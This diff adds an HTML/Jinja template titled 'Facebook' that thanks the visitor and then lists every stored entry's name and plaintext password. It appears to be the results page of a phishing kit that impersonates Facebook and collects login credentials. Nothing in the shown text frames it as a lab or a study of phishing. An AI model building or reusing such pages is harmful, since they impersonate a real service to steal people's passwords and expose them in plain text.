@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="../static/styles.css">
+</head>
+<body>
+    <p>Thank You!</p>
+    {% for entrie in queries %}
+        <p>Name: {{ entrie['name'] }}</p>
+        <p>Password: {{ entrie['password'] }}</p>
+    {% endfor %}
+</body>
+</html>
